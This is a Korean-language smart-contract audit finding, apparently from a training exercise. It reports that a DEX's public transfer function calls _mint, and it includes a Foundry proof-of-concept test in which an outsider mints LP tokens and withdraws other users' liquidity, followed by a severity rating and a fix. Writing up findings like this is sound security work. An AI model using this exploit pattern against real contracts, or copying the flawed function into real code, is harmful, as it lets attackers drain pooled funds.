## 김영운, 김지우, 구민재

### 설명

문제 발생 - transfer function

```solidity
function transfer(address to, uint256 lpAmount) public override(ERC20, IDex) returns (bool) { //visibility
        _mint(to, lpAmount);
        return true;
}
```

- transfer 함수의 visibility가 public으로 설정되어 있어 누구나 호출할 수 있음
- _mint를 누구나할 수 있어 totalSupply(LP token양)를 조작할 수 있음

테스트

```solidity

contract CustomERC20 is ERC20 {
    constructor(string memory tokenName) ERC20(tokenName, tokenName) {
        _mint(msg.sender, 1000 ether);
    }

    function mint(uint amount) external {
        _mint(msg.sender,amount);
    }
}

contract DexTest is Test {
    Dex public dex;
    CustomERC20 tokenX;
    CustomERC20 tokenY;

    address player1 = address(0x1234);
    address player2 = address(0x1235);
    address player3 = address(0x1236);
    address player4 = address(0x1237);

    function setUp() public {
        tokenX = new CustomERC20("XXX");
        tokenY = new CustomERC20("YYY");

        dex = new Dex(address(tokenX), address(tokenY));

        tokenX.approve(address(dex), type(uint).max);
        tokenY.approve(address(dex), type(uint).max);

        vm.startPrank(player1);
        tokenX.mint(10000 ether);
        tokenY.mint(10000 ether);
        tokenX.approve(address(dex), type(uint).max);
        tokenY.approve(address(dex), type(uint).max);
        dex.addLiquidity(1000 ether, 1000 ether, 0); //lp = 1000
        vm.stopPrank();

        vm.startPrank(player2);
        tokenX.mint(10000 ether);
        tokenY.mint(10000 ether);
        tokenX.approve(address(dex), type(uint).max);
        tokenY.approve(address(dex), type(uint).max);
        dex.addLiquidity(1000 ether, 1000 ether, 0); //lp = 1000
        vm.stopPrank();

    }

    function testTransfer() external {
        vm.startPrank(player3);
        uint before = dex.balanceOf(player3);
        emit log_named_uint("before",before);
        bool t = dex.transfer(player3, 100 ether);
        uint a = dex.balanceOf(player3);
        emit log_named_uint("after",a);

        emit log_named_uint("before x:", tokenX.balanceOf(player3));
        emit log_named_uint("before y:", tokenY.balanceOf(player3));
        dex.removeLiquidity(dex.balanceOf(player3), 0,0);
        emit log_named_uint("after  x:", tokenX.balanceOf(player3));
        emit log_named_uint("after  y:", tokenY.balanceOf(player3));
        vm.stopPrank();
    }
}
```

![스크린샷 2023-03-26 오후 6.42.32.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eaf7d4ba-fe73-4bd8-a897-43d8e471cc8d/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2023-03-26_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_6.42.32.png)

- player1, player2가 pool에 liquidity를 공급하였을때, player3가 100 ether를 mint하여 해당 LP token만큼 removeLiquidity할 수 있음

### 파급력

- Critical → 공격자는 mint 함수를 통해 LP token을 발행하여, liquidity를 pool에 공급하지 않더라도 pool에 있는 토큰을 모두 remove할 수 있음

### 해결방안

- transfer 함수의 visibility를 public → internal/private로 변경하기
